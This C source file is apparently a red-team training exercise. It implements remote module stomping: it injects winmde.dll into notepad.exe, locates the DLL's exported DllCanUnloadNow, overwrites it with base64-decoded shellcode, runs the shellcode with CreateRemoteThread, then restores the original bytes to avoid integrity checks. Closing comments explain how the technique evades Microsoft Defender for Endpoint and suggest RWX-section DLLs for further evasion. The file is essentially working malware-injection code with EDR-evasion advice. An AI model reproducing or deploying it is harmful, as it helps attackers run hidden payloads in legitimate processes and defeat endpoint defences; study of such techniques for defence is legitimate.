#include <windows.h>
#include "psapi.h"
#include <TlHelp32.h>
#include "sc.h"
#include <stdio.h>

#define EXPORTEDFUNCTION "DllCanUnloadNow"
#define DLLPATH L"C:\\windows\\system32\\winmde.dll"
#define DLLNAME "winmde.dll"
#define INJECTEDPROCESS "notepad.exe"


#define DEBUG(x, ...) printf(x, ##__VA_ARGS__)

// The encoding table used by the base64
static char encoding_table[] = { 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/' };
static char* decoding_table = NULL;

// Build the decoding table that will be used by the base64_decode function
void build_decoding_table() {

    decoding_table = (char*)malloc(256);
    if (decoding_table == NULL) {
        DEBUG("[x] Cannot allocate memory for the decoding table\n");
        exit(-1);
    }
    for (int i = 0; i < 64; i++) {
        decoding_table[(unsigned char)encoding_table[i]] = i;
    }
}

/****************************************************************/
/* This function is used to debase64 a string                   */
/* base64_decode(sc, sc_length, &szOutput);                     */
/****************************************************************/
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {

    if (decoding_table == NULL) build_decoding_table();

    if (input_length % 4 != 0) return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') {
        (*output_length)--;
    }
    if (data[input_length - 2] == '=') (*output_length)--;

    unsigned char* decoded_data = (unsigned char*)malloc(*output_length);
    if (decoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        DWORD sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        DWORD sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        DWORD triple = (sextet_a << 3 * 6)
            + (sextet_b << 2 * 6)
            + (sextet_c << 1 * 6)
            + (sextet_d << 0 * 6);

        if (j < *output_length) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

/************************************************************/
/* This function takes the name of a process and store its  */
/* PID in the PID parameter and return the process HANDLE   */
/* The PID is NULL if the function failed                   */
/*                                                          */
/* HANDLE proc = getProcHandlebyName(L"notepad.exe", &pid); */
/************************************************************/
HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) {
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	NTSTATUS status = NULL;
	HANDLE hProc = 0;

    // Get a list of all currently running process
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (!snapshot) {
		DEBUG("[x] Cannot retrieve the processes snapshot\n");
		return NULL;
	}
	if (Process32First(snapshot, &entry)) {
		do {
            // Parse each process information
			if (strcmp((entry.szExeFile), procName) == 0) {
                // Retrieve the PID of the right process
				*PID = entry.th32ProcessID;
				DEBUG("[+] Injecting into : %d\n", *PID);
                // Open an handle on this process
				HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
				if (!hProc) {continue;}
				return hProc;
			}
		} while (Process32Next(snapshot, &entry));
	}

    // Return NULL if no process have been found or opened
	return NULL;
}

/************************************************************************************/
/*                                                                                  */
/*                                 NEW FUNCTIONS                                    */
/*                                                                                  */
/************************************************************************************/

/****************************************************************/
/* This function is used to retrieve the base address of a DLL  */
/* loaded in a remote process.                                  */
/****************************************************************/
DWORD64 getDLLBaseAddress(HANDLE processHandle, char* dllName) {
	HMODULE modules[1024];
	SIZE_T modulesSize = sizeof(modules);
	DWORD modulesSizeNeeded = 0;

    // Retrieve the list of the modules directly from the PEB on the
    // remote process
	EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded);
	SIZE_T modulesCount = modulesSizeNeeded / sizeof(HMODULE);

    // Enumerate all modules until the wanted one is found
	for (size_t i = 0; i < modulesCount; i++){
		HMODULE remoteModule = modules[i];
		CHAR remoteModuleName[128];
        // Retrieve the module name
		GetModuleBaseNameA(
			processHandle,
			remoteModule,
			remoteModuleName,
			sizeof(remoteModuleName)
		);

        // Return the module address if the name match
		if (_stricmp(remoteModuleName, dllName) == 0) {
			return (DWORD64)modules[i];
		}
	}
	return -1;
}


/***********************************************************************/
/* Exactly like GetProcAddress, but work on a remote process.          */
/* This is needed when we want to hook a remote function               */
/* functionAdd = getProcAddressEx(procHandle, dllBaseAddress, fctName) */
/***********************************************************************/
DWORD64 getProcAddressEx(HANDLE processHandle, DWORD64 baseAddress, char* functionName) {
    // This function will retrieve the DLL PE Header and enumerate its export directory
    // until it find the function name.

	void* buffer = calloc(0x1000, sizeof(char));
	if (!buffer) {
		return NULL;
	}
	DWORD bufferSize = 0x1000;

    // Retrieve the PE header bytes to access to the DLL export directory
	DWORD status = ReadProcessMemory(processHandle, (PVOID)baseAddress, buffer, bufferSize, NULL);
	if (!status) {
		DEBUG("[x] Cannot read process memory : %d\n", GetLastError());
		return -1;
	}

    // Map the retrieved byte to the PE header structures
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)buffer + dosHeader->e_lfanew);
	IMAGE_DATA_DIRECTORY* dataDirectory = ntHeader->OptionalHeader.DataDirectory;

    // Retrieve the export directory address
	DWORD exportDirectoryRVA = dataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	IMAGE_EXPORT_DIRECTORY exportDirectory;

    // Retrieve the export directory content
	status = ReadProcessMemory(processHandle, (PVOID)(exportDirectoryRVA + baseAddress), &exportDirectory, sizeof(IMAGE_EXPORT_DIRECTORY), NULL);
	if (!status) {
		DEBUG("[x] Cannot read export directory : %d\n", GetLastError());
		return -1;
	}

    // Once the export directory is found, just enumerate each entry
	for (int i = 0; i < exportDirectory.NumberOfFunctions; i++) {
		char* name = calloc(100, sizeof(char));
		if (!name) {
			DEBUG("[x] Cannot allocate function name buffer\n");
			return -1;
		}
		DWORD offset;

        // Read the process memory to retrieve the address where the name of the current function
        // is stored
		status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNames + i * sizeof(DWORD), &offset, sizeof(DWORD), NULL);
		if (!status) {
			DEBUG("[x] Cannot read address of names : \n", GetLastError());
			return -1;
		}

        // Then retrieve the name of the function
		PVOID nameAddress = ((DWORD64)baseAddress + offset);
		status = ReadProcessMemory(processHandle, nameAddress, name, 100, NULL);
		if (!status) {
			DEBUG("[x] Cannot read name address : %d\n", GetLastError());
			return -1;
		}

        // If the function is the one we want
		if (strcmp(name, functionName) == 0) {
			WORD offsetOrdinal = -1;
			DWORD offsetFunction = -1;

            // Retrieve its ordinal to get its offset in the memory
			status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfNameOrdinals + i * sizeof(WORD), &offsetOrdinal, sizeof(WORD), NULL);
			if (!status) {
				DEBUG("[x] Cannot read ordinal value : %d\n", GetLastError());
				return -1;
			}

            // Finally, retrieve its RVA
			status = ReadProcessMemory(processHandle, baseAddress + exportDirectory.AddressOfFunctions + offsetOrdinal * sizeof(DWORD), &offsetFunction, sizeof(DWORD), NULL);
			if (!status) {
				DEBUG("[x] Cannot read function RVA : %d\n", GetLastError());
				return -1;
			}
			
            // That's it, return the function address
			DWORD64 functionAddr = baseAddress + offsetFunction;
			return functionAddr;
		}
	}

	return -1;

}


/****************************************************************/
/* This function is used to inject a given DLL in a remote      */
/* process                                                      */
/****************************************************************/
BOOL injectDLL(LPCWSTR moduleToInject, HANDLE processHandle) {

    // Allocate memory in the remote process to write the DLL name
    // that will be injected.
    // WCHAR is used as LoadLibraryW will be used to load the DLL
	SIZE_T regionSize = wcslen(moduleToInject) * sizeof(WCHAR);
	NTSTATUS ntStatus;
	PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, regionSize, MEM_COMMIT, PAGE_READWRITE);
	if (!remoteBuffer) {
		DEBUG("[x] Cannot allocate space for the dll name into the remote process\n");
		return FALSE;
	}

	// Then write the DLL name in the allocated space
	BOOL status = WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, regionSize, NULL);
	if (!status) {
		DEBUG("[x] Cannot write the dll name into the remote process memory\n");
		return FALSE;
	}

    // Retrieve the LoadLibraryW function address
	HMODULE kernel32 = GetModuleHandle("KERNEL32.DLL", NULL);
	if (!kernel32) {
		DEBUG("[x] Cannot retrieve Kernel32 module\n");
		return FALSE;
	}

	PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryW");
	if (!threadRoutine) {
		DEBUG("[x] Cannot find function address through GetProcAddress\n");
		return FALSE;
	}
	

    // Create a new thread starting at LoadLibraryW with the DLL name buffer
    // address as parameter.
    // This will execute LoadLibraryW(L"DLLName") in the remote process
	HANDLE dllThread;
	DEBUG("[+] Buffer address : %p\n", remoteBuffer);
	dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL);
	if (!dllThread) {
		DEBUG("[x] Cannot create the remote thread\n");
		return FALSE;
	}

    // Wait for the DLL to be loaded, and return.
	WaitForSingleObject(dllThread, 1000);
	return TRUE;
}

int main(void){
    /*************************************************************/
    /* The goal is to implement a injector that will load a DLL  */
    /* in a remote process and  use the allocated space to write */
    /* the malicious shellcode.                                  */
    /*************************************************************/

    // First Step: Retrieve the payload
    // Hints : Use one of the technique used in step 1
    buildsc();
    size_t szOutput;
    unsigned char* scBytes = base64_decode(sc, sc_length, &szOutput);
	if (szOutput == 0) {
		DEBUG("[x] Base64 decode failed \n");
		return -1;
	}
    int scLength = szOutput;



    // Second Step: Retrieve the process handle
    // Hints : Use the getProcHandlebyName function
    DWORD pid;
    HANDLE procHandle = getProcHandlebyName(INJECTEDPROCESS, &pid);
	if (!procHandle) {
		DEBUG("[x] Cannot get process handle\n");
		return -1;
	}




    // Third step: Inject the DLL in the remote process
    // Hints : Exactly like module stomping, but now target a remote process
    //         Look at the injectDLL function
    // Hands On : Look with process hacker if the DLL has been well loaded
    //            Put un breakpoint on LoadLibraryW in the injected process and 
    //            check the injected process thread stack 
    BOOL injectionStatus = injectDLL(DLLPATH, procHandle);
	if (!injectionStatus) {
		DEBUG("[x] Cannot inject the DLL\n");
		return -1;
	}



    // Fourth step: Retrieve the DLL base address
    // Hints : Like a GetModuleHandle, but on a remote process
    //         The EnumProcessModules function can be used to enumerate all DLL
    //         loaded by a process.
	DWORD64 dllBaseAddress = getDLLBaseAddress(procHandle, DLLNAME);
	if (dllBaseAddress == -1) {
		DEBUG("[x] Cannot find dll base address\n");
		return -1;
	}
	DEBUG("[+] DLL Base Address : %p\n", dllBaseAddress);




    // Fifth step: Retrieve the function address that will be stomped
	// Hints : Like a GetProcAddress but on a remote process
    //         The DLL exported address RVA are stored in the DLL exportDirectory.
    //         Retrieving the DLL PE header is the first step.
    //         Look at the getProcAddressEx function
	DWORD64 entryPoint = getProcAddressEx(procHandle, dllBaseAddress, EXPORTEDFUNCTION);
	if (entryPoint == -1) {
		DEBUG("[x] Cannot find the function address\n");
		return -1;
	}
	DEBUG("[+] Entrypoint address : %p\n", entryPoint);




    // Sixth step: Stomp the function with your malicious code
    // Hints : We are juste writting some byte on a specific address here
	// HandsOn : Check the threadstack on the injected process
	// Solution : The threadstack shows a new thread executing instruction from the WinMDE.DLL memory
	//			  space and not from random address.

    // We save the content of the function we modify so we can restore it
    // when the injection succeeds
	SIZE_T sz;
	PBYTE saveFunction = calloc(scLength, sizeof(BYTE));
	DWORD status = ReadProcessMemory(procHandle, entryPoint, saveFunction, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot write read process memory to get stomped function code : %d\n", GetLastError());
		return -1;
	}
	DEBUG("[+] Initial function saved\n");
	
    // We write the payload in the stomped memory space allocated during the
    // DLL injection
	status = WriteProcessMemory(procHandle, entryPoint, scBytes, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot write process memory : %d\n", GetLastError());
		return -1;
	}
	DEBUG("[+] Function stomped\n");

    // We run the malicious code
	HANDLE dllThread;
	dllThread = CreateRemoteThread(procHandle, NULL, 0, (PTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);

	if (!dllThread) {
		DEBUG("[x] Cannot create the remote thread\n");
		return -1;
	}
	DEBUG("[+] Thread created\n");
	
	WaitForSingleObject(dllThread, 1000);
	Sleep(1000);

    // And we restore the function to limit integrity detection
	status = WriteProcessMemory(procHandle, entryPoint, saveFunction, scLength * sizeof(BYTE), &sz);
	if (!status) {
		DEBUG("[x] Cannot rewrite initial code in process memory : %d\n", GetLastError());
		return -1;
	}
	DEBUG("[+] Function restored\n");
	return 0;


    /****************************************************************/
    /*                          MDE                                 */
    /****************************************************************/

	// MDE should not raise any alert about anomalous memory cause the main allocation is performed
	// using LoadLibrary. Thus, MDE think that the different section allocated has been allocated to
	// map the DLL in memory which is a legit behavior.
	// Moreover, the different VirtualAlloc performed are used to allocate small piece of memory (<4kb) 
	// which are allocation that are usually not detected by EDR.
	// This technic shows that it is possible, using alternative functions, to allocate memory in remote
	// process without directly using VirtualAlloc.

	// The main problem here that could (or not) arise few minutes later on MDE is the fact that several 
	// virtual protect are performed to write the payload on the WinMDE.DLL .text section. An idea to 
	// avoid these alerts is to choose a DLL with a built-in RWX section. This technique is (now) called
	// MockingJay.
	// My different attempts seems to show that as long as the section protection is reset to its initial
	// protection before any execution, you should be OK. However, if you set the protection of the .data
	// section from RW to RX and then execute code from this section, MDE can go crazy cause the initial
	// protection has been changed and it's something that can be tracked using the section VAD that contains
	// the initial section protection.

	// MDE should raise a Suspicious thread creation alert as CreateRemoteThread has been heavily used 
	// to inject the DLL and redirect the process execution flow to execute the beacon.
	// This CreateRemoteThread is still mandatory as we do not have any alternative method at the moment
	// to change the process execution flow.

	
}
